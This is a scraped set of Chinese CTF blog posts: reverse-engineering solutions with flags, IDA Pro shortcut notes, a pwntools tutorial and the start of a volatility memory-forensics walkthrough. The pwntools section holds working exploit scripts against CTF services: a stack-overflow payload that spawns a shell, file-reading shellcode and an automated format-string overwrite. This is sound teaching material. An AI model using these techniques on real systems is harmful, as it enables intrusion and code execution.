用于存放执行中的函数对应的栈帧的栈顶地址ip(instruction pointer): 指向当前执行指令的下一条指令 前缀加上 r 表示 64 位， e 表示 32 位，使用时表示该寄存器存储 xx 位的数据。 （3）执行过程123456789101112131415161718192021222324252600000000004004e6 &lt;func&gt;: 4004e6: 55 push rbp /*函数调用 4004e7: 48 89 e5 mov rbp,rsp */ 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi //rdi 存第一个参数 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi //esi 存第二个参数 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 //在[rbp-0x4]写入 0x1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] //把[rbp-0x4]的值送入 eax ,即 eax = 1 4004fd: 48 63 d0 movsxd rdx,eax //扩展,传送 rdx=1 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] //第一个参数 [rbp-0x18]，rax=input[0] 400504: 48 01 d0 add rax,rdx //rax = input[1] 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] //第 6 行中存储的 0x1 ,传入 edx ,即 edx =1 40050a: 48 63 ca movsxd rcx,edx //rcx=1 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] // rdx = input[0] 400511: 48 01 ca add rdx,rcx //rdx += rcx ,rdx = input[1] 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] //ecx = input[1] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] //edx = 0x1 40051a: 31 ca xor edx,ecx //edx ^= ecx ,原先 ecx 为 1100111，edx 为 0000001，操作后 edx 为 1100110，即 f 40051c: 88 10 mov BYTE PTR [rax],dl //rax = dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 //[rbp-0x4]处为 0x1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] //把[rbp-0x4]的值送入 eax，eax=1 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] // 比较操作，将[rbp-0x1c] 处的值与eax比较，改变状态位，eax=28时，ZF=1，否则ZF=0 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; //eax &lt; 28 时跳转至 4004fa func(input, 28); ZF=1时跳出 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret -word 表示字q 四字 d 双字dword qword 12dword 2*16 =32 位qword 4*16 = 64 位 PTR 指针（pointer）没有寄存器名时， X ptr 指明内存单元的长度，X 在汇编指令中可以为word 或 byte 。 内存地址 1[rbp-0x18] 涉及指令 123456781.movsxd 指令为扩展至零将32位的寄存器和内存操作数符号扩展到64位的寄存器2.逻辑异或运算指令 XOR XOR OPRD1,OPRD2 实现两个操作数按位‘异或’(异为真,相同为假)运算,结果送至目的操作数中.OPRD1&lt;--OPRD1 XOR OPRD23.JLE 小于等于时转移 操作行为链： 123rdx——raxedx——rcxrcx——rdx 作为累加 简单来说就是input[i]*i，最后用ASCII码输出 我们来用Swift语言实现 123456789101112131415161718import UIKit;func main()&#123; var inputs:[Int] = [0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c] var flag = Slove(inputs: inputs,num: 28) print((flag))&#125;func Slove(inputs:Array&lt;Int&gt;,num:Int)-&gt; String&#123; var flag = \" \" for i in 1...num &#123; var char1 = Character(UnicodeScalar(inputs[i-1]^i)!); flag += String(char1); &#125; return flag&#125;main() 还可以使用Python语言来实现 12345678910111213def func(inputs, num): flag = '' for i in range(1, num): flag += chr(inputs[i-1] ^ i) return flagdef main(): inputs = [0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c] flag = func(inputs, 28) print flagif __name__=='__main__': main() 可获得Flag：flag{read_asm_is_the_basic} 3.Py交易根据题意可知，即为Python逆向题目，打开在线Python反编译应用，推荐：https://tool.lu/pyc/ 可获得反编译代码 12345678910111213141516171819202122#!/usr/bin/env python# encoding: utf-8import base64 def encode(message): #def定义了一个encode模块的变量 s = '' #为了存入最后的目标串 for i in message: #ord()函数主要用来返回对应字符的ascii码 x = ord(i) ^ 32 #将输入的字符串中每个字符ascii码都与32进行异或运算 x = x + 16 #每个都加上16 s += chr(x) #再将它们一个一个转为字符 return base64.b64encode(s) #最后再将新串进行一次base64加密 correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt' #输入的串flag = '' #为了存入最后的目标串print 'Input flag:' #屏幕提示信息 请输入flagflag = raw_input() #获取输入if encode(flag) == correct: #如果加密后的flag与correct相同 输出correct print 'correct' else: #否则输出wrong print 'wrong' 分析代码可知，输入的Flag，要经过每个字符对应的ascii码与32进行异或运算，且加上16，再转换为ascii字符，最后再将新的flag字符串进行一次base64加密，与’XlNkVmtUI1MgXWBZXCFeKY+AaXNt’进行匹配。那么反过来，只要将’XlNkVmtUI1MgXWBZXCFeKY+AaXNt’进行base64解密，每个字符转换为ascii码，减去16，与32进行异或，再输出为字符即可获得flag。 我们用Swift语言进行实现(Swift的Base64我没搞定，有莫名其妙的BUG） 12345678910111213141516171819202122232425import UIKitextension Character//扩充方法使字符转为ascii码&#123; func toInt() -&gt; Int &#123; var intFromCharacter:Int = 0 for scalar in String(self).unicodeScalars &#123; intFromCharacter = Int(scalar.value) &#125; return intFromCharacter &#125;&#125;func main()&#123; var str:String = \"^SdVkT#S ]`Y\\\\!^)ism\" var flag = \" \" for i in str &#123; var num = Character(UnicodeScalar((i.toInt()-16)^32)!) flag += String(num) &#125; print(flag)&#125;main() 也可以使用Python实现 12345678import base64correct ='XlNkVmtUI1MgXWBZXCFeKY+AaXNt's = base64.b64decode(correct)flag =''for i in s:i = chr((ord(i)-16)^32)flag += i print flag 可获得Flag：nctf{d3c0mpil1n9_PyC} 4、WxyVM用Winhex打开以后可以看出来是ELF文件，所以用Ghidra打开,在内存地址为004006e2的地方发现名为FUN_004006e3的函数，通过分析可以得知即为main函数 12345678910111213141516171819202122232425262728undefined8 FUN_004006e3(void)&#123; size_t sVar1; bool bVar2; int local_c; puts(\"[WxyVM 0.0.1]\"); puts(\"input your flag:\"); scanf(\"%s\",&amp;DAT_00604b80); FUN_004005b6(); sVar1 = strlen(&amp;DAT_00604b80); bVar2 = sVar1 == 0x18; local_c = 0; while (local_c &lt; 0x18) &#123; if ((int)(char)(&amp;DAT_00604b80)[(long)local_c] != *(int *)(&amp;DAT_00601060 + (long)local_c * 4)) &#123; bVar2 = false; &#125; local_c = local_c + 1; &#125; if (bVar2) &#123; puts(\"correct\"); &#125; else &#123; puts(\"wrong\"); &#125; return 0;&#125; 所以经过分析可以判断变换后的flag在601060处。函数的主体还是比较简单的，现在需要对输入之后的4005b6函数进行分析。 12345678910111213141516171819202122232425262728293031323334353637383940__int64 sub_4005B6()&#123; unsigned int v0; // ST04_4 __int64 result; // rax signed int i; // [rsp+0h] [rbp-10h] char v3; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 14999; i += 3 ) &#123; v0 = byte_6010C0[i]; v3 = byte_6010C0[i + 2]; result = v0; switch ( v0 ) &#123; case 1u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) += v3; break; case 2u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) -= v3; break; case 3u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) ^= v3; break; case 4u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) *= v3; break; case 5u: result = byte_6010C0[i + 1]; *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + 2]); break; default: continue; &#125; &#125; return result;&#125; 函数是对一个比较长的数组进行操作6010c0处的数组进行操作，一共有15000个数据，每三个为一组，v0决定进行什么操作，v2用来寻址操作，v3作为操作数利用这个函数对已知的数据进行逆运算就能够得到最终的输入结果了。这里要注意对已知数据进行逆向的时候计数的时候也要倒着计数，从14999~0 9.注意！！！ 再次重申，请不要未经同意便盗用我们的题目，如果有使用的需要，请和我们联系，联系方式已经在notice已经给出.flag{zhaowomen} 可获得Flag：flag{zhaowomen}","categories":[],"tags":[]},{"title":"菜鸟IdaPro入门笔记","slug":"Pro╚δ├┼▒╩╝╟","date":"2019-09-14T16:10:52.000Z","updated":"2019-09-15T07:15:26.000Z","comments":true,"path":"2019/09/14/Pro╚δ├┼▒╩╝╟/","link":"","permalink":"http://yoursite.com/2019/09/14/Pro╚δ├┼▒╩╝╟/","excerpt":"","text":"开始界面New（新建）Go（运行）Previous（上一个）主界面工作区IDA View-A 反汇编窗口HexView-A 十六进制格式显示的窗口Imports 导入表（程序中调用到的外面的函数）Functions 函数表（这个程序中的函数）Structures 结构Enums 枚举IDA View-A反汇编窗口寄存器AX BX CX DX——通用寄存器CS——代码段寄存器IP——指令指针寄存器DS——段地址寄存器SS——栈段寄存器SP——栈偏移寄存器IEAX——”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。EBX——”基地址”(base)寄存器, 在内存寻址时存放基地址。ECX——计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。EDX——被用来放整数除法产生的余数。ESI/EDI——分别叫做”源/目标索引寄存器”(source/destination index),因为在很多字符串操作指令中， DS:ESI指向源串,而ES:EDI指向目标串。EBP——”基址指针”(BASE POINTER), 它最经常被用作高级语言函数调用的”框架指针”(frame pointer)。ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。资料转移指令######MOV——移动 ######MOVC——程式记忆体移动 ######MOVX——外部RAM和扩展I/O口与寄存器A的数据传送指令 PUSH——放入堆栈POP——由堆叠取回XCH——8位元交换XCHD——低4位元交换SWAP——高低4位元交换算术指令ADD——两数相加ADDC——两数相加再加CSUBB——两数相减再减CINC——加一指令DEC——减一指令MUL——（MUL AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存BDIV——（DIV AB 除法指令仅此一条）相除指令，所得商存A，余数存B控制转移类指令JC——C=1时跳JNC——C=0时跳JB——位元=1时跳JNB——位元=0时跳JBC——位元=1时跳且清除此位元LCALL——长调用子程序ACALL——绝对调用子程序RET——由副程式返回RETI——由中断副程式返回AJMP——绝对转移SJMP——相对转移JMP——@A+DPTR 散转，相对DPTR的间接转移JZ——A=0时跳JNZA——0时跳CJNE——二数比较,不相等时跳DJNZ——减一,不等於0时跳NOP——空操作位变量指令SETB——设定为1ORG 程序开始，规定程序的起始地址END——程序结束EQU——等值指令（先赋值后使用）例：SUM EQU 30HDB——定义字节指令DW——定义字内容DS——定义保留一定的存贮单元数目BIT——位地址符号指令 例：SAM BIT P1.0RET——子程序返回指令RETI——中断子程序返回指令$ 本条指令地址IDA快捷键空格键——反汇编窗口切换文本跟图形ESC——退到上一个操作地址G——搜索地址或者符号N——重命名；——注释ALT+M——添加标签CTRL+M——列出所有标签CTRL +S——二进制段的开始地址结束地址C code——光标地址出内容解析成代码P——在函数开始处使用P，从当前地址处解析成函数D——data解析成数据A——ASCII解析成ASCIIU——unDefined解析成未定义的内容X——交叉引用F5——C伪代码ALT+T——搜索文本ALT+B——搜索16进制 搜索opcodeCTRL+ALT+B——打开断点列表F7——单步步入F8——单步不过CTRL+F7——运行到函数返回地址F4——运行到光标处 窗口名称 快捷键 Names Window Shift+F4 Functions Window Shift+F3 Strings Window Shift+F12 Segments Shift+F7 Segment registers Shift+F8 Signatures Shift+F5 Type libraries Shift+F11 Structures Shift+F9 Enumerations Shift+F10 Data Format Options 窗口名称 快捷键 备注 ASCII strings style Alt+A Setup data types Alt+D File Operations 窗口名称 快捷键 备注 Parse C header file Ctrl+F9 Create ASM file Alt+F10 Save database Ctrl+W Navigation 窗口名称 快捷键 备注 Jump to operand Enter Jump in new window Alt+Enter Jump to previous position Esc Jump to next position Ctrl+Enter Jump to address G Jump by name Ctrl+L Jump to function Ctrl+P Jump to segment Ctrl+S Jump to segment register Ctrl+G Jump to problem Ctrl+Q Jump to cross reference Ctrl+X Jump to xref to operand X Jump to entry point Ctrl+E Mark Position Alt+M Jump to marked position Ctrl+M Debugger 窗口名称 快捷键 备注 Start process F9 Terminate process Ctrl+F2 Step into F7 Step over F8 Run until return Ctrl+F7 Run to cursor F4 Breakpoints 窗口名称 快捷键 备注 Breakpoint list Ctrl+Alt+B Watches 窗口名称 快捷键 备注 Delete watch Del Tracing 窗口名称 快捷键 备注 Stack trace Ctrl+Alt+S Search 窗口名称 快捷键 备注 Next code Alt+C Next data Ctrl+D Next explored Ctrl+A Next unexplored Ctrl+U Immediate value Alt+I Next immediate value Ctrl+I Text Alt+T Next text Ctrl+T Sequence of bytes Alt+B Next sequence of bytes Ctrl+B Not function Alt+U Next void Ctrl+V Error operand Ctrl+F Graphing 窗口名称 快捷键 备注 Flow chart F12 Function calls Ctrl+F12 Miscellaneous 窗口名称 快捷键 备注 Calculator ? Cycle through open views Ctrl+Tab Select tab Alt + [1…N] Close current view Ctrl+F4 Exit Alt+X IDC Command Shift+F2 Edit (Data Types – etc) 窗口名称 快捷键 备注 Copy Ctrl+Ins Begin selection Alt+L Manual instruction Alt+F2 Code C Data D Struct variable Alt+Q ASCII string A Array Num * Undefine U Rename N Operand Type 窗口名称 快捷键 备注 Offset (data segment) O Offset (current segment) Ctrl+O Offset by (any segment) Alt+R Offset (user-defined) Ctrl+R Offset (struct) T Number (default) # Hexadecimal Q Decimal H Binary B Character R Segment S Enum member M Stack variable K Change sign Underscore (_) Bitwise negate ~ Manual _ Alt+F1 Comments 窗口名称 快捷键 备注 Enter comment : Enter repeatable comment ; Enter anterior lines Ins Enter posterior lines Shift+Ins Insert predefined comment Shift+F1 Segments 窗口名称 快捷键 备注 Edit segment Alt+S Change segment register value Alt+G Structs 窗口名称 快捷键 备注 Struct var Alt+Q Force zero offset field Ctrl+Z Select union member Alt+Y Functions 窗口名称 快捷键 备注 Create function P Edit function Alt+P Set function end E Stack variables Ctrl+K Change stack pointer Alt+K Rename register V Set function type Y","categories":[],"tags":[]},{"title":"PWNTOOLS的使用","slug":"PWNTOOLS╡─╩╣╙├","date":"2019-09-14T16:09:08.000Z","updated":"2019-09-15T07:09:36.000Z","comments":true,"path":"2019/09/14/PWNTOOLS╡─╩╣╙├/","link":"","permalink":"http://yoursite.com/2019/09/14/PWNTOOLS╡─╩╣╙├/","excerpt":"","text":"pwntools是一个二进制利用框架。官方文档提供了详细的api规范。由于本文只是用来介绍pwntools使用方法，不会过于详细的讲解各种二进制漏洞攻击技术。 Pwntools的“Hello World”栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。 1#include &lt;stdio.h&gt;``#include &lt;string.h&gt;``#include &lt;stdlib.h&gt;``void func(``int` `key)&#123;`` ``char overflowme[``32``];`` ``printf(``&quot;overflow me : &quot;``);`` ``gets(overflowme); ``/``/` `smash me!`` ``if``(key ``=``=` `0xcafebabe``)&#123;`` ``system(``&quot;/bin/sh&quot;``);`` ``&#125;`` ``else``&#123;`` ``printf(``&quot;Nah..\\n&quot;``);`` ``&#125;``&#125;``int` `main(``int` `argc, char``*` `argv[])&#123;`` ``func(``0xdeadbeef``);`` ``return` `0``;``&#125; pwntools脚本： 1from` `pwn ``import` `*``c ``=` `remote(``&quot;pwnable.kr&quot;``, ``9000``) ``c.sendline(``&quot;AAAA&quot;` `*` `13` `+` `p32(``0xcafebabe``))``c.interactive() 源码简洁明了，我们只需要将key改写成0xcafebabe。 现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。 remote(&quot;一个域名或者ip地址&quot;, 端口) 会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 c). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法： send(payload) 发送payload sendline(payload) 发送payload，并进行换行（末尾\\n） sendafter(some_string, payload) 接收到 some_string 后, 发送你的 payload recvn(N) 接受 N(数字) 字符 recvline() 接收一行输出 recvlines(N) 接收 N(数字) 行输出 recvuntil(some_string) 接收到 some_string 为止 在第三行中, p32() 可以让我们转换整数到小端序格式. p32 转换4字节. p64 和 p16 则分别转换 8 bit 和 2 bit 数字. c.sendline 将我们的payload发送到远程主机. &quot;AAAA&quot; * 14 是我们到key的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。 最后，我们成功getshell了. 这时，你可能想发送命令进行交互. c.interactive() 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 . 写 Shellcode下一题是pwnable.kr的asm. 你需要用 ssh -p2222 asm@pwnable.kr 并输入密码 guest 来查看可执行文件和源码. 这里，我们只展示利用代码： 1from` `pwn ``import` `*` `p ``=` `process(``&quot;./asm&quot;``)``context.log_level ``=` `&apos;DEBUG&apos;``gdb.attach(p)` `context(arch``=``&apos;amd64&apos;``, os``=``&apos;linux&apos;``)` `shellcode ``=` `shellcraft.amd64.pushstr(``&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;``)``shellcode ``+``=` `shellcraft.amd64.linux.``open``(``&apos;rsp&apos;``,``0``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.read(``&apos;rax&apos;``,``&apos;rsp&apos;``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.write(``1``, ``&apos;rsp&apos;``, ``100``)` `p.recvuntil(``&apos;shellcode: &apos;``)``p.send(asm(shellcode))``log.success(p.recvall()) 我们这里用到了新的api: process(), contex.log_level, gdb.attach, 和 shellcraft.process 和 remote 累死. remote 连接远程主机, process 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, process 返回的对象可以通过 gdb.attach(p) 将进程attach到gdb上. Attach 之后, gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编). 提醒一下，如果你想在命令行中使用gdb.attach(), 便需要安装并运行 tmux. 更多关于tmux的信息. 当我们想查看服务器输出时，并不需要在每个 recvline 或者 recvuntil 前加 print. 当 context.log_level 被设置为 &quot;DEBUG&quot; , 我们的输入和服务器的输出会被直接输出. shellcraft 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 open 了一个文件并 read 文件到 stdout. 关于这个类更多的文档, 你可以查阅 官方文档. 格式化漏洞自动化我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子： 1from` `pwn ``import` `*``import` `tempfile` `program ``=` `tempfile.mktemp()``source ``=` `program ``+` `&quot;.c&quot;``write(source, ``&apos;&apos;&apos;``#include &lt;stdio.h&gt;``#include &lt;stdlib.h&gt;``#include &lt;unistd.h&gt;``#include &lt;sys/mman.h&gt;``#define MEMORY_ADDRESS ((void*)0x11111000)``#define MEMORY_SIZE 1024``#define TARGET ((int *) 0x11111110)``int main(int argc, char const *argv[])``&#123;`` ``char buff[1024];`` ``void *ptr = NULL;`` ``int *my_var = TARGET;`` ``ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);`` ``if(ptr != MEMORY_ADDRESS)`` ``&#123;`` ``perror(&quot;mmap&quot;);`` ``return EXIT_FAILURE;`` ``&#125;`` ``*my_var = 0x41414141;`` ``write(1, &amp;my_var, sizeof(int *));`` ``scanf(&quot;%s&quot;, buff);`` ``dprintf(2, buff);`` ``write(1, my_var, sizeof(int));`` ``return 0;``&#125;&apos;&apos;&apos;``)``cmdline ``=` `[``&quot;gcc&quot;``, source, ``&quot;-Wno-format-security&quot;``, ``&quot;-m32&quot;``, ``&quot;-o&quot;``, program]``process(cmdline).wait_for_close()``def` `exec_fmt(payload):`` ``p ``=` `process(program)`` ``p.sendline(payload)`` ``return` `p.recvall()` `autofmt ``=` `FmtStr(exec_fmt)``offset ``=` `autofmt.offset``p ``=` `process(program, stderr``=``PIPE)``addr ``=` `u32(p.recv(``4``))``payload ``=` `fmtstr_payload(offset, &#123;addr: ``0x1337babe``&#125;)``p.sendline(payload)``print` `hex``(unpack(p.recv(``4``))) 有了 FmtStr, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 autofmt. 这个对象包含 offset, 即算好的偏移量. fmtstr_payload(offset, {address: value}) 帮我们生成最后的payload. 第一个参数 offset 用 autofmt.offset 算好的即可. 然后, 我们需要声明 {address: value} 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址: {address1: value1, address2:value2,..., address: valueN}. 有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload fmtstr_payload. 使用 ELF()有些题目给了我们libc. 用 gdb&gt; x function1 — function2 算偏移量太麻烦了, 因此有了 ELF. 1from` `pwn ``import` `*` `e ``=` `ELF(``&apos;./example_file&apos;``)``print` `hex``(e.address) ``# 0x400000``print` `hex``(e.symbols[``&apos;write&apos;``]) ``# 0x401680``print` `hex``(e.got[``&apos;write&apos;``]) ``# 0x60b070``print` `hex``(e.plt[``&apos;write&apos;``]) ``# 0x401680``offset ``=` `e.symbols[``&apos;system&apos;``] ``-` `e.symbols[``&apos;printf&apos;``] ``# calculate offset``binsh_address ``=` `next``(e.search(``&apos;/bin/sh\\x00&apos;``)) ``# find address which contains /bin/sh 和 process() 一样, 我们只用将路径给 ELF(path) 即可分析 ELF. 我们有以下几种方法操纵ELF: symbols[&#39;a_function&#39;] 找到 a_function 的地址 got[&#39;a_function&#39;] 找到 a_function的 got plt[&#39;a_function&#39;] 找到 a_function 的 plt next(e.search(&quot;some_characters&quot;)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址. 总结Pwntools 是一套十分强大的工具. 在本文中, 我介绍了最常用的几个api, 但 pwntools 还有很多其他强大的api，诸如 qemu, adb. 各位可通过官方文档进行剩余的学习","categories":[],"tags":[]},{"title":"护网杯2019-MISC-baby_forensic","slug":"╗ñ═°▒¡2019-MISC-baby-forensic","date":"2019-09-11T06:39:57.000Z","updated":"2019-09-11T21:40:28.000Z","comments":true,"path":"2019/09/10/╗ñ═°▒¡2019-MISC-baby-forensic/","link":"","permalink":"http://yoursite.com/2019/09/10/╗ñ═°▒¡2019-MISC-baby-forensic/","excerpt":"","text":"这是一题以内存取证为主题，包含着密码学和USB流量分析的杂项题，还是很有趣的，首先我们拿到了一个名为data.vmem的内存文件，可以知道这就是内存取证的题目 内存取证我们需要使用到一个叫做volatility的内存取证神器 Volatility是开源的Windows，Linux，macOS，Android的内存取证分析工具，由Python编写成，命令行操作，支持各种操作系统 使用Volatility判断镜像信息，获取操作系统类型 1volatility -f ?.img/raw/... imageinfo 知道操作系统类型后，用--profile指定 1volatility -f ?.img --profile=... 查看当前显示的notepad文本 1volatility -f file.raw --profile=WinXPSP2x86 notepad 查看当前运行的进程 1volatility -f file.raw --profile=WinXPSP2x86 psscan/pslist 扫描所有的文件列表(常常结合grep) 1volatility -f file.raw --profile=WinXPSP2x86 filescan 常常配合的grep为 1| grep \"doc\\|docx\\|rtf\" //查看文档 1| grep \"jpg\\|jpeg\\|png\\|tif\\|gif\\|bmp\"//查看图片 1| grep \"Desktop\"//查看桌面 根据offset提取出文件 1volatility -f file.raw --profile=WinXPSP2x86 dumpfiles -D . -Q 0x..... 扫描 Windows 的服务 1volatility -f file.raw --profile=WinXPSP2x86 svcscan 查看网络连接 1volatility -f file.raw --profile=WinXPSP2x86 connscan 查看命令行上的操作 1volatility -f file.raw --profile=WinXPSP2x86 cmdscan 根据pid dump出相应的进程 1volatility -f easy_dump.img --profile=Win7SP1x64 memdump -p 2580 -D 目录 查看截图 1volatility -f mem.data --profile=Win7SP1x64 screenshot --dump-dir=. 获取 IE 浏览器的使用情况 1volatility -f mem.vmem –profile=WinXPSP2x86 iehistory 列举缓存在内存的注册表 1volatility -f mem.vmem –profile=WinXPSP2x86 hivelist 打印出注册表中的数据 1volatility -f mem.vmem –profile=WinXPSP2x86 hivedump -o 注册表的 virtual 地址 获取SAM表中的用户 1volatility -f mem.vmem –profile=WinXPSP2x86 printkey -K “SAM\\Domains\\Account\\Users\\Names” 获取最后登录系统的账户 1volatility -f mem.vmem –profile=WinXPSP2x86 printkey -K “SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon” 提取出内存中记录的 当时正在运行的程序有哪些，运行过多少次，最后一次运行的时间等信息 1volatility -f mem.vmem –profile=WinXPSP2x86 userassist 取证获取镜像信息1234567891011121314Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/root/文档/baby_forensic/data.vmem) PAE type : PAE DTB : 0xb18000L KDBG : 0x80546ae0L Number of Processors : 1 Image Type (Service Pack) : 3 KPCR for CPU 0 : 0xffdff000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2019-09-04 14:28:47 UTC+0000 Image local date and time : 2019-09-04 22:28:47 +0800 可以知道这个镜像是WindowsXP的内存镜像我们接下来继续取证 搜索进程首先我们要看一下出题人在镜像里干了什么 12345678910111213141516171819202122232425262728Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0x817bd830 System 4 0 58 173 ------ 0 0x8163eb88 smss.exe 372 4 3 19 ------ 0 2019-09-04 14:27:46 UTC+0000 0x814229d8 csrss.exe 460 372 10 400 0 0 2019-09-04 14:27:46 UTC+0000 0x813c1020 winlogon.exe 484 372 24 462 0 0 2019-09-04 14:27:46 UTC+0000 0x81560020 services.exe 668 484 16 270 0 0 2019-09-04 14:27:46 UTC+0000 0x812b7cd0 lsass.exe 680 484 25 359 0 0 2019-09-04 14:27:46 UTC+0000 0x816c8cc8 vmacthlp.exe 836 668 1 25 0 0 2019-09-04 14:27:46 UTC+0000 0x81333b38 svchost.exe 848 668 21 201 0 0 2019-09-04 14:27:46 UTC+0000 0x812fa020 svchost.exe 932 668 11 263 0 0 2019-09-04 14:27:47 UTC+0000 0x80ed83c0 svchost.exe 1028 668 71 1193 0 0 2019-09-04 14:27:47 UTC+0000 0x81559020 svchost.exe 1072 668 5 59 0 0 2019-09-04 14:27:47 UTC+0000 0x81330020 svchost.exe 1116 668 15 201 0 0 2019-09-04 14:27:47 UTC+0000 0x81433420 explorer.exe 1428 1392 15 370 0 0 2019-09-04 14:27:48 UTC+0000 0x81323c20 spoolsv.exe 1564 668 15 138 0 0 2019-09-04 14:27:48 UTC+0000 0x815f2020 svchost.exe 1976 668 5 88 0 0 2019-09-04 14:28:05 UTC+0000 0x815f1da0 VGAuthService.e 188 668 2 60 0 0 2019-09-04 14:28:05 UTC+0000 0x81542da0 vmtoolsd.exe 256 668 9 266 0 0 2019-09-04 14:28:05 UTC+0000 0x80e848b0 wmiprvse.exe 988 848 9 190 0 0 2019-09-04 14:28:13 UTC+0000 0x80e81020 alg.exe 1172 668 7 110 0 0 2019-09-04 14:28:14 UTC+0000 0x81534020 rundll32.exe 1220 1428 4 78 0 0 2019-09-04 14:28:14 UTC+0000 0x815ddda0 vmtoolsd.exe 1660 1428 7 175 0 0 2019-09-04 14:28:14 UTC+0000 0x80e7b020 ctfmon.exe 1668 1428 1 71 0 0 2019-09-04 14:28:14 UTC+0000 0x80eaab78 wscntfy.exe 1088 1028 1 39 0 0 2019-09-04 14:28:15 UTC+0000 0x81528090 cmd.exe 1636 1428 1 34 0 0 2019-09-04 14:28:34 UTC+0000 0x815258b0 conime.exe 1676 1636 1 38 0 0 2019-09-04 14:28:34 UTC+0000 0x80ea56a8 wordpad.exe 1448 1428 4 113 0 0 2019-09-04 14:28:42 UTC+0000 可以看到这里有两个值得关注的应用程序进程,分别是wordpad.exe、cmd.exe，但是我们还是没法得出出题人到底在干嘛，我们进行下一步 查看截图 好像还是不知道在干什么，只可以知道大概是开启了一个cmd，然后启动了一个类似wireshark的程序，也许正在抓包 查看CMD命令1234567**************************************************CommandProcess: csrss.exe Pid: 460CommandHistory: 0x36e3850 Application: cmd.exe Flags: Allocated, ResetCommandCount: 1 LastAdded: 0 LastDisplayed: 0FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x5e0Cmd #0 @ 0x55d868: hill_matrix 3,2,2,9,7,7,6,4,9 这里获得了一个重要的信息：hill_matrix 3,2,2,9,7,7,6,4,9 查看可疑文件查看文档： 1230x000000000181c2c8 1 0 R--rwd \\Device\\HarddiskVolume1\\WINDOWS\\system32\\shdocvw.dll0x00000000019333d8 1 0 R--rw- \\Device\\HarddiskVolume1\\WINDOWS\\system32\\mydocs.dll0x0000000001a4c658 1 0 R--rwd \\Device\\HarddiskVolume1\\WINDOWS\\system32\\shdocvw.dll 查看图片： 1234tures\\Administrator.bmp0x00000000017e02d0 1 0 R--rwd \\Device\\HarddiskVolume1\\WINDOWS\\system32\\wlnotify.dll0x0000000001a44f28 1 0 R--rwd \\Device\\HarddiskVolume1\\WINDOWS\\Web\\Wallpaper\\Bliss.bmp0x0000000001aa0868 1 0 R--rwd \\Device\\HarddiskVolume1\\WINDOWS\\system32\\wlnotify.dll 查看桌面： 12340x00000000012d8ef8 1 0 R--r-- 